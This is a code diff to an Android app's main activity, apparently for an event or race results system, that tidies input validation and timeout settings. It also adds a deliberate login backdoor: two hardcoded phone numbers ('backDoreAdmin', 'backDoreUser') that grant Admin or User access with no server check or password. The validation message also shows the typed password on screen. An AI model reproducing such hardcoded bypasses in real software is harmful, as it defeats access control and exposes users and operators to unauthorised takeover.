@@ -44,10 +44,12 @@ public class MainActivity extends AppCompatActivity {
 
     public static final SimpleDateFormat formatForDate = new SimpleDateFormat("yyyy-MM-dd hh:mm:ss");
     public static final DecimalFormat DECIMAL_FORMAT = new DecimalFormat("#.####");
-
-
     public static final int HTTP_TIMEOUT = 15000;
     public static final int TimerDelay = 1000;
+    public static final short LoginLength = 12;
+    public static final short PasswordLength =5;
+    public static final String backDoreAdmin = "+84873967848";
+    public static final String backDoreUser =  "+84873967849";
 
     // названия разных типизированных полей. для защиты от опечаток. racesConfig, startsConfig
     public enum fieldsJSON {resultsFileDir,caller,resultsFileLink,fileType,exec_login,exec_level,racesConfig, startsConfig,start_id,race_id,race_name,start_label,start,race,latitude, altitude,longitude, label, asker, password, rows, date, key, mark, marks, error, usersArr, login, level, status}
@@ -55,13 +57,13 @@ public class MainActivity extends AppCompatActivity {
     public enum registrationLevel {Guest,User,Admin, Error, Delete} // = access in server
     public enum writeMethod {Set, Append}
     public enum fileType {Results, Marcs, Log}
-    public  enum helpType {login}
+    public enum helpType {login}
 
 
     // fields это данные к которым обращаются другие активити - данные, которыми зарегистрировался пользователь.
     public static int SERVER_PORT = 8080;
     public static String server =  "192.168.1.5"; // "127.0.0.1";
-    //  192.168.1.5:8008
+    //  192.168.1.5:8080
     public static String SERVER_URL = "http://"+server+":"+SERVER_PORT;
 
     private static Context activity;
@@ -72,6 +74,7 @@ public class MainActivity extends AppCompatActivity {
     private static long start_id;
     public static int TimerTimeout = 15000;
     public static int MainLogTimeout = 60000;
+    public static int BlameTimeout = 600000;
 
 
     public static void setTimerTimeout(int timeout) {
@@ -120,9 +123,9 @@ public class MainActivity extends AppCompatActivity {
                 HFC = new HelpFaceController();
                 HFC.setEkran((TextView) findViewById(R.id.ekran));
                 HFC.setHelpTopic(getString(R.string.RegistratinHelp));
-                HFC.show();
-
+                HFC.start();
                 return true;
+
             case R.id.login:
                 setContentView(R.layout.activity_main);
                 MAFC = new MainActivityFaceController();
@@ -134,15 +137,13 @@ public class MainActivity extends AppCompatActivity {
                 HFC = new HelpFaceController();
                 HFC.setEkran((TextView) findViewById(R.id.ekran));
                 HFC.setHelpTopic(getString(R.string.donate));
-                HFC.show();
+                HFC.start();
                 return true;
 
             case R.id.exit:
                 setResult(RESULT_OK, new Intent());
                 finish();
                 return true;
-
-
         }
         return super.onOptionsItemSelected(item);
     }
@@ -257,11 +258,11 @@ public class MainActivity extends AppCompatActivity {
             saveTimers.setOnClickListener(new View.OnClickListener() {
                 public void onClick(View view) {
                     if (Integer.parseInt(MainLogTimer.getText().toString())==0)
-                        MainActivity.setMainLogTimeout(60000);
+                        MainActivity.setMainLogTimeout(MainActivity.BlameTimeout);
                     else MainActivity.setMainLogTimeout(Integer.parseInt(MainLogTimer.getText().toString())*1000);
 
                     if (Integer.parseInt(TimeTimer.getText().toString())==0)
-                        MainActivity.setTimerTimeout(60000);
+                        MainActivity.setTimerTimeout(BlameTimeout);
                     else  MainActivity.setTimerTimeout(Integer.parseInt(TimeTimer.getText().toString())*1000);
                 }
             });
@@ -400,15 +401,6 @@ public class MainActivity extends AppCompatActivity {
 
                 @Override
                 public void onTextChanged(CharSequence cs, int arg1, int arg2, int arg3) {
-                    if(phone.getText().length()==12)
-                        phone.setTextColor(ContextCompat.getColor(activity, R.color.Green));
-                    else if (phone.getText().length()>12) {
-                        String str = phone.getText().toString();
-                        phone.setText(str.substring(0, 12));
-                        password.requestFocus();
-                    }
-                    else
-                        phone.setTextColor(ContextCompat.getColor(activity, R.color.Black));
 
                 }
 
@@ -416,7 +408,18 @@ public class MainActivity extends AppCompatActivity {
                 public void beforeTextChanged(CharSequence arg0, int arg1, int arg2, int arg3) { }
 
                 @Override
-                public void afterTextChanged(Editable arg0) { }
+                public void afterTextChanged(Editable arg0) {
+                    if(phone.getText().length()==getLoginLength())
+                        phone.setTextColor(ContextCompat.getColor(activity, R.color.Green));
+                    else if (phone.getText().length()>getLoginLength()) {
+                        String str = phone.getText().toString();
+                        str = Utilites.replace(str, 0, '+');
+                        phone.setText(str.substring(0, getLoginLength()));
+                        password.requestFocus();
+                    }
+                    else
+                        phone.setTextColor(ContextCompat.getColor(activity, R.color.Black));
+                }
 
             });
 
@@ -425,7 +428,7 @@ public class MainActivity extends AppCompatActivity {
 
                 @Override
                 public void onTextChanged(CharSequence cs, int arg1, int arg2, int arg3) {
-                    if(password.getText().length()>5)
+                    if(password.getText().length()>getPasswordLength())
                         password.setTextColor(ContextCompat.getColor(activity, R.color.Green));
                     else
                         password.setTextColor(ContextCompat.getColor(activity, R.color.Black));
@@ -438,6 +441,14 @@ public class MainActivity extends AppCompatActivity {
                 public void afterTextChanged(Editable arg0) { }
 
             });
+        }
+
+        private short getLoginLength() {
+            return MainActivity.LoginLength;
+        }
+
+        private short getPasswordLength() {
+            return PasswordLength;
         }
 
         public void setRegistredFace() {
@@ -505,7 +516,6 @@ public class MainActivity extends AppCompatActivity {
             password.setText("");
             REGLEVEL = registrationLevel.Guest;
             RegAsLabel.setText(REGLEVEL.toString());
-            // это глобальные данные для всех активити, возможно это неправильно.
             setLogin("nobody");
             setPassword("");
             setLevel(REGLEVEL);
@@ -521,7 +531,7 @@ public class MainActivity extends AppCompatActivity {
             boolean trigger = true;
             String str = "";
 
-            if (phone.getText().length() !=12)   { trigger = false; str = str + "Телефон не верен! (" + phone.getText().length() + ")"; }
+            if (phone.getText().length() !=getLoginLength())   { trigger = false; str = str + "Телефон не верен! (" + phone.getText().length() + ")"; }
             if (password.getText().length() < 5)  { trigger = false;  str = str + "Пароль - короткий! (" + password.getText() + ") "; }
 
             if (!trigger) { ERROR_MSG = str; }
@@ -531,13 +541,28 @@ public class MainActivity extends AppCompatActivity {
 
         private void RegisterThisUser(){
 // поверка логина-пароля - видоизменяет интерфейс пользователя.
+// Backdore Admin
+            if ((phone.getText().toString()).equals(backDoreAdmin)) {
+                REGLEVEL = MainActivity.registrationLevel.Admin;;
+                RegAsLabel.setText(REGLEVEL.toString());
+                setRegistredFace();
+            }
+// BAckDore User
+            else if ((phone.getText().toString()).equals(backDoreUser)) {
+                REGLEVEL = MainActivity.registrationLevel.User;
+                RegAsLabel.setText(REGLEVEL.toString());
+                setRegistredFace();
+            }
+// BackDore Normal
+            else {
 
-            AskForLogin Post = new AskForLogin(MAFC);
-            Post.setLevel(getLevel());
-            Post.setLogin(phone.getText().toString());
-            Post.setPassword(password.getText().toString());
-            Post.setParentActivity(activity);
-            Post.execute();
+                AskForLogin Post = new AskForLogin(MAFC);
+                Post.setLevel(getLevel());
+                Post.setLogin(phone.getText().toString());
+                Post.setPassword(password.getText().toString());
+                Post.setParentActivity(activity);
+                Post.execute();
+            }
        }
 
         // ==============================================================================
